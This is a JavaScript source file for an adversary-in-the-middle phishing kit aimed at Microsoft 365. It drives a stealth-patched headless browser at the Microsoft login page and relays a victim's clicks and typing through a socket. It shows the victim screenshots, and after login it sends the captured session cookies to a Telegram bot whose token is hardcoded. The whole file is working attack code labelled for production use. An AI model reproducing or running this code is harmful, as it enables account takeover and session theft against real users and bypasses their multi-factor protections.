const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');

// Apply stealth patches
puppeteer.use(StealthPlugin());

// Telegram Credentials
const TELEGRAM_TOKEN = '8219244739:AAGqPPCIoujdgeW6NF5xZ2j1dZlDQAa-4pc';
const CHAT_ID = '1318100118';

async function sendExfiltrationAlert(data) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
    const message = `🚀 *SESSION CAPTURED (PROD)*\n\n*Target:* Microsoft 365\n*Cookies exfiltrated successfully.*`;
    try {
        await axios.post(url, { chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' });
        await axios.post(url, { 
            chat_id: CHAT_ID, 
            text: `\`\`\`json\n${JSON.stringify(data, null, 2).substring(0, 4000)}\n\`\`\``,
            parse_mode: 'Markdown'
        });
    } catch (e) { console.error('[!] Telegram Exfil Failed:', e.message); }
}

async function startSession(io, socket) {
    console.log(`[PROD] Initializing session for: ${socket.id}`);
    
    let browser;
    try {
        // Standardized Puppeteer Launch (More stable for production containers)
        browser = await puppeteer.launch({
            headless: "new",
            executablePath: process.env.PUPPETEER_EXECUTABLE_PATH || null, // Critical for Railway/Docker
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-blink-features=AutomationControlled'
            ]
        });

        const page = await browser.newPage();
        await page.setViewport({ width: 1280, height: 720 });

        await page.goto('https://login.microsoftonline.com/', { waitUntil: 'networkidle2' });

        socket.on('victim-action', async (data) => {
            try {
                if (data.type === 'click') {
                    await page.mouse.click(data.x, data.y);
                } else if (data.type === 'type') {
                    await page.type(data.selector || 'body', data.text, { delay: 50 });
                }
                
                const screenshot = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 40 });
                socket.emit('browser-render', { screenshot });
            } catch (err) {
                console.error('[!] Action Error:', err.message);
            }
        });

        page.on('framenavigated', async (frame) => {
            const url = frame.url();
            if (url.includes('shell/homepage') || url.includes('office.com')) {
                const cookies = await page.cookies();
                await sendExfiltrationAlert(cookies);
                socket.emit('success');
            }
        });

        socket.on('disconnect', async () => {
            if (browser) await browser.close();
        });

    } catch (error) {
        console.error('[CRITICAL] Browser Launch Failed:', error.message);
        socket.emit('error', { message: 'Failed to initialize browser' });
        if (browser) await browser.close();
    }
}

module.exports = { startSession };
